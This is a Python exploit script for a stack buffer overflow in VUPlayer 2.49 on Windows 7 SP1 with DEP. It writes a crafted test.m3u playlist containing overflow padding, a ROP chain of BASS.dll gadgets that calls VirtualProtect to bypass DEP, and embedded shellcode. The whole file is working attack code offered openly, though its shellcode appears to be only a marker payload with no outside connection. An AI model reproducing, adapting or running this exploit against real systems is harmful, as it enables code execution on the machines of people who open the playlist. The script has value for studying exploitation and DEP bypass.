#
# VUPlayer 2.49 Stack Buffer Overflow Exploit
#                           - Windows7 SP1 + DEP
#                           - by hyunmini

import struct

p = open("test.m3u", "w")

SHELLCODE  = (
"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42"
"\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03"
"\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b"
"\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e"
"\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c"
"\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x69\x21"
"\x21\x01\x68\x6e\x6d\x69\x6e\x68\x20\x68\x79\x75\x89\xe1\xfe"
"\x49\x0b\x31\xc0\x51\x50\xff\xd7"
)

def create_rop_chain():
	rop_gadgets = [
		0x100190b0,  # POP EDI # RETN [BASS.dll] 
		0x1001dc05,  # RETN (ROP NOP) [BASS.dll]
		0x10015f77,  # POP EAX # RETN [BASS.dll] 
		0x10040284,  # ptr to &VirtualProtect() [IAT BASS.dll]
		0x1001eaf1,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [BASS.dll] 
		0x10030950,  # XCHG EAX,ESI # RETN [BASS.dll] 
		0x100106e1,  # POP EBP # RETN [BASS.dll] 
		0x10022aa7,  # & jmp esp [BASS.dll]
		0x10015f82,  # POP EAX # RETN [BASS.dll] 
		0xfffffdff,  # Value to negate, will become 0x00000201
		0x10014db4,  # NEG EAX # RETN [BASS.dll] 
		0x10032f72,  # XCHG EAX,EBX # RETN 0x00 [BASS.dll] 
		0x10015fe7,  # POP EAX # RETN [BASS.dll] 
		0xffffffc0,  # Value to negate, will become 0x00000040
		0x10014db4,  # NEG EAX # RETN [BASS.dll] 
		0x10038a6c,  # XCHG EAX,EDX # RETN [BASS.dll] 
		0x100163c7,  # POP ECX # RETN [BASS.dll] 
		0x1060d0ca,  # &Writable location [BASSMIDI.dll]
		0x10015f77,  # POP EAX # RETN [BASS.dll] 
		0x90909090,  # nop
		0x1001d7a5,  # PUSHAD # RETN [BASS.dll] 
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

rop_chain = create_rop_chain() 

payload = "A"*1012 + rop_chain + SHELLCODE

p.write(payload)
p.close()